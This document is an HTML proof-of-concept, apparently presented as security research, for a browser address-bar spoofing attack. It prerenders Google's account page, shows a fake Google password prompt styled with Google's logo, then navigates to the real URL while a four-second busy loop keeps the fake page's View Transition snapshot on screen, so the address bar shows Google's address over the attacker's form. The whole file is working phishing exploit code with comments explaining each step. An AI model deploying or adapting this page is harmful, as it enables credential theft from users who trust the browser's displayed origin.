<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Security Research</title>
    <script type="speculationrules">
    {
      "prerender": [{
        "source": "list",
        "urls": ["https://myaccount.google.com/"]
      }]
    }
    </script>
    <style>
        body { font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; }
        .box { border: 1px solid #dadce0; padding: 30px; border-radius: 12px; max-width: 350px; margin: 0 auto; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .btn { background: #1a73e8; color: white; border: none; padding: 18px 30px; border-radius: 6px; font-size: 16px; width: 100%; cursor: pointer; }
        #status { margin-top: 20px; color: #5f6368; font-weight: bold; }
    </style>
</head>
<body>

    <div id="phish-ui">
        <div class="box">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
            <h3>Identity Check</h3>
            <p>Your session requires a refresh. Please confirm your account.</p>
            <input type="password" placeholder="Confirm Google Password" style="width:100%; padding:12px; margin:10px 0; border:1px solid #ccc; border-radius:4px;">
            <button class="btn" onclick="triggerSpeculativeSpoof()">Verify Now</button>
        </div>
    </div>
    <div id="status">Ready</div>

    <script>
        function triggerSpeculativeSpoof() {
            const target = "https://myaccount.google.com/";
            const status = document.getElementById('status');
            
            // 2. The View Transition: Captures a 'snapshot' of our fake UI
            document.startViewTransition(async () => {
                status.innerText = "PRERENDER ACTIVATING...";
                
                // 3. Navigate to the already-prerendered page
                // Because it's prerendered, the URL bar will jump INSTANTLY
                window.location.href = target;

                // 4. THE EXPLOIT: We use a microtask loop to prevent 
                // the browser from 'clearing' the transition snapshot.
                const lockTime = 4000; // 4 second window
                const start = Date.now();
                while (Date.now() - start < lockTime) {
                    // We flood the CPU just enough to keep the 'Old' UI snapshot 
                    // visible while the 'New' URL (Google) is in the Omnibox.
                    if (Math.random() > 0.99) {
                        console.log("Stalling renderer...");
                    }
                }
            });
        }
    </script>
</body>
</html>
